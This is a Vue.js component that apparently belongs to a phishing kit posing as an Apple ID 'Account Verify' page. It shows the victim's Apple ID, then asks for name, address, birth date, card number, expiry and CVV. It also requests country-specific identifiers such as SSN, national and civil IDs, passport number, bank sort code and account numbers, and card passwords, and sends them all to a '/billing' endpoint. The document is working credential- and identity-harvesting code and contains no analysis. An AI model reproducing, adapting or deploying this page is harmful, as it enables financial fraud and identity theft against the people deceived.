<template>
  <div class="app-container">

    <div class="vld-parent">
        <loading
          :active.sync="loading"
          :can-cancel="false"
          :is-full-page="true"
          color="white"
          :height="30"
          :width="60"
          background-color="black"
        />
    </div>

    <div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container large-centered">
      <div class="splash-section">
        <div class="row person-wrapper">
          <div class="column large-9 small-12 appleid-col">
            <div class="flex-container">
              <h1 class="tk-section-headline appleid-user">
                <span role="text">
                  <small class="tk-intro appleid-username">Apple&nbsp;ID<br><span class="acc-name force-ltr">{{ $route.params.appleid }}</span></small>
                </span>
              </h1>
            </div>
          </div>
          <div class="not-mobile column large-3">
            <div class="flex-container-signout">
              <div class="signout pull-right">
                <button class="button button-flat button-overlay button-link" @click.prevent="signOut" >Sign out</button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    </div>
    <div class="container" style="margin-top: 10px;">
      <form @submit.prevent="onSubmit">
        <div class="row">
          <div class="col-md-6">
            <div style="padding-top: 20px; padding-left: 10px; text-align: left;">FULL NAME</div>
            <div class="row" style="margin-right: 5px">
              <div class="col-md-12">
                <input required v-model="form.required.name.first" type="text" placeholder="First Name" class="form-control">
                <input v-model="form.required.name.middle" type="text"placeholder="Middle Name (Optional)" class="form-control" style="margin: 5px;" name="middle" value="">
                <input required v-model="form.required.name.last" type="text" placeholder="Last Name" class="form-control" style="margin: 5px;" value="">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div style="padding-top: 20px; padding-left: 10px; text-align: left;">ADDRESS</div>
            <div class="row" style="margin-right: 5px">
              <div class="col-md-12">
                <input required v-model="form.required.address1" type="text" placeholder="Address line 1" class="form-control" >
                <input v-model="form.required.address2" type="text" placeholder="Address line 2 (Optional)" class="form-control" style="margin: 5px;" name="middle" value="">
                <input required v-model="form.required.city" type="text" placeholder="City" class="form-control">
                <div class="row" style="margin-top: -10px; margin-bottom: -10px;">
                  <div class="col-md-8">
                    <input required v-model="form.required.state" type="text" placeholder="State" class="form-control">
                  </div>
                  <div class="col-md-4">
                    <input required v-model="form.required.postal" type="text" placeholder="Postal Code" class="form-control">
                  </div>
                </div>
                <input required v-model="form.required.phone" type="tel" v-mask="'+###############'" placeholder="Phone number" class="form-control">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div style="padding-top: 20px; padding-left: 10px; text-align: left;">DATE OF BIRTH</div>
            <div class="row" style="margin-right: 5px">
              <div class="col-md-12">
                <input required v-model="form.required.dob" type="text" v-mask="'## / ## / ####'" placeholder="day / month / year" class="form-control" >
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div style="padding-top: 20px; padding-left: 10px; text-align: left;">PAYMENT METHOD</div>
            <div class="row" style="margin-right: 5px">
              <div class="col-md-12 input-icons">
                <fade-transition>
                  <div class="alert-error" v-if="card.error.length">
                    {{ card.error[0][0] }}.
                  </div>
                </fade-transition>
                <input type="text" ref="cardNumber" v-mask="'#### #### #### ####'" v-model="card.number" placeholder="•••• •••• •••• ••••" class="form-control" >
                <img :src="require(`../assets/image/${getBrand}.png`)" class="icon">
                <input type="text" v-cardformat:formatCardExpiry v-model="card.exp" placeholder="•• / ••••" class="form-control" >
                <input type="text" v-cardformat:formatCardCVC v-model="card.cvv" placeholder="•••" class="form-control" >
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div class="row" style="margin-right: 5px">
              <div class="col-md-12">
                <div class="form-group" v-for="(t, index) in form.addition"  :key="index">
                  <input v-if="t.country.includes($store.state.user.country)" v-for="(a, index) in t.form" :key="index" :placeholder="a.placeholder" class="form-control" v-mask="a.mask" type="text" v-model="a.value" required>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div class="pull-right">
              <button type="submit" class="billing--button disabled">Complete</button>
            </div>
          </div>
        </div>
      </form>
    </div>
  </div>
</template>
<script>

import Loading from 'vue-loading-overlay'
import 'vue-loading-overlay/dist/vue-loading.css'

import Vue from 'vue'
import { mask } from 'vue-the-mask'
import axios from 'axios'

import VueCardFormat from 'vue-credit-card-validation';
Vue.use(VueCardFormat);

export default {
  metaInfo: {
    titleTemplate: 'Account Verify - Apple ID'
  },
  components: { Loading },
  directives: { mask },
  data() {
    return {

      loading: false,

      card: {
        number: '',
        exp: '',
        cvv: '',
        brand: '',
        error: []
      },
      form: {
        required: {
          name: {
            first: '',
            middle: '',
            last: '',
          },
          address1: '',
          address2: '',
          city: '',
          state: '',
          postal: '',
          phone: '',
          dob: '',
        },
        addition: [
          {
            country: ['US', 'CA'],
            form: [
              {
                name: 'ssn',
                placeholder: 'SSN',
                mask: '###-##-####',
                value: ''
              }
            ]
          },
          {
            country: ['QA'],
            form: [
              {
                name: 'qatarid',
                placeholder: 'Qatar ID',
                mask: '### ### ### ### ### ### ### ###',
                value: ''
              }
            ]
          },
          {
            country: ['GR', 'HK'],
            form: [
              {
                name: 'idnumber',
                placeholder: 'ID Number',
                mask: '### ### ### ### ### ### ### ###',
                value: ''
              }
            ]
          },
          {
            country: ['TH'],
            form: [
              {
                name: 'citizenid',
                placeholder: 'Citizen ID',
                mask: '### ### ### ### ### ### ### ###',
                value: ''
              }
            ]
          },
          {
            country: ['SA'],
            form: [
              {
                name: 'nationalid',
                placeholder: 'National ID',
                mask: '### ### ### ### ### ### ### ###',
                value: ''
              }
            ]
          },
          {
            country: ['UK', 'IE', 'GB'],
            form: [
              {
                name: 'sortcode',
                placeholder: 'Sort Code',
                mask: '## ## ##',
                value: ''
              }
            ]
          },
          {
            country: ['CY'],
            form: [
              {
                name: 'passportnumber',
                placeholder: 'Passport Number',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['KW'],
            form: [
              {
                name: 'civilid',
                placeholder: 'Civil ID',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['NZ'],
            form: [
              {
                name: 'bankaccessnumber',
                placeholder: 'Bank Access Number',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['UK','IE','IN','CH','GB', 'AU'],
            form: [
              {
                name: 'accountnumber',
                placeholder: 'Account Number',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['IE','TH','IN','NZ','AU'],
            form: [
              {
                name: 'creditlimit',
                placeholder: 'Credit Limit',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['AU'],
            form: [
              {
                name: 'bankaccount',
                placeholder: 'Bank Account',
                mask: '##################',
                value: ''
              },
              {
                name: 'nab',
                placeholder: 'NAB ID/OSID',
                mask: '##################',
                value: ''
              }
            ]
          },
          {
            country: ['JP', 'CH'],
            form: [
              {
                name: 'cardid',
                placeholder: 'Card ID',
                mask: '##################',
                value: ''
              },
              {
                name: 'cardpassword',
                placeholder: 'Card Password',
                mask: '##################',
                value: ''
              }
            ]
          },
        ]
      }
    }
  },
  computed: {
    getBrand() {
      if (!this.card.brand || this.card.brand == 'dinersclub' || this.card.brand == 'unionpay') {
        return 'unknown'
      }
      return this.card.brand
    }
  },
  watch: {
    async 'card.number'(e) {
      if (!e) { this.card.brand = ''}
      await this.$cardFormat.setCardType({
        currentTarget : this.$refs.cardNumber,
        value: e
      })
      this.card.brand = this.$refs.cardNumber.dataset.cardBrand
    }
  },
  methods: {
    value() {
      const data  = []
      this.form.addition.forEach((item, i) => {
        item.form.forEach((form, i) => {
          data.push({
            name: form.name,
            asu: form.placeholder,
            value: form.value
          })
        })
      })
      return data
    },
    signOut() {
      this.$store.dispatch('signOut').then(() => { this.$router.push({ name: 'Login' }) })
    },
    validateCreditCard() {
      this.card.error = []
      if(!this.$cardFormat.validateCardNumber(this.card.number)){
        this.card.error.push(['Credit card invalid'])
      }
      if (!this.$cardFormat.validateCardExpiry(this.card.exp.replace(' ', ''))) {
        this.card.error.push(['Invalid expiration date'])
      }
      if (!this.$cardFormat.validateCardCVC(this.card.cvv)) {
        this.card.error.push(['Invalid cvv'])
      };
    },
    async onSubmit() {
      this.validateCreditCard()
      if (!this.card.error.length) {

        this.loading = true

        const data  = await this.value()
        await axios.post('/billing', {
          required: this.form.required,
          addition: data,
          card: this.card
        })
        .then((e) => {
          this.loading  = false
          if (e.data == 'success') {
            this.$router.push({ name: 'complete', params: { appleid: this.$route.params.appleid } })
          }
        })

        this.loading  = false
      }
    }
  }
}
</script>
<style scoped>
@import '../assets/css/bootstrap.css';
@import '../assets/css/billing.css';

@media (min-width: 1000px) {
  .input-icons img {
    position: absolute;
    width: 50px;
    margin-top: -37px;
    margin-left: 86.5%;
  }
}
@media (max-width: 800px) {
  .input-icons img {
    position: absolute;
    width: 50px;
    margin-top: -37px;
    margin-left: 90.8%;
  }
}
@media (max-width: 420px) {
  .input-icons img {
    position: absolute;
    width: 85px;
    margin-top: -58px;
    margin-left: 77.5%;
  }
}
@media (max-width: 400px) {
  .input-icons img {
    position: absolute;
    width: 85px;
    margin-top: -58px;
    margin-left: 74.5%;
  }
}
@media only screen and (max-device-width: 600px)
{
  .icon {
    background: #f5faff00;
    color: white;
    padding: 11px;
    margin-top: 5px;
    margin-left: -80px;
    width: 80px;
  }
  .input-container {
    display: -ms-flexbox; /* IE10 */
    display: flex;
    width: 100%;
    margin: 0px;
    padding: 0px;
  }
}
/* @media (min-width: 700px) {
  .icon {
    margin-top: -36px;
    margin-left: 87%;
    width: 45px;
  }
}
.icon {
  float: right;
  position: absolute;
}
@media (max-width: 600px) {
  .icon {
    width: 65px;
    margin-top: -47px;
    margin-left: 79%;
  }
}
@media (max-width: 400px) {
  .icon {
    width: 65px;
    margin-top: -47px;
    margin-left: 77%;
  }
}
@media (max-width: 350px) {
  .icon {
    width: 65px;
    margin-top: -47px;
    margin-left: 73%;
  }
} */
.alert-error {
  background-color: #fae9a3;
  color: #503e30;
  border: 1px solid #ffa50096;
  border-radius: 3px;
  margin-left: 10px;
  margin-top: 10px;
  width: 100%;
  padding: 10px;
}
.form-control {
  font-size: 14px;
}
.form-control::-webkit-input-placeholder {
  font-size: 13px;
  opacity: 0.8;
  color: #999;
}
</style>
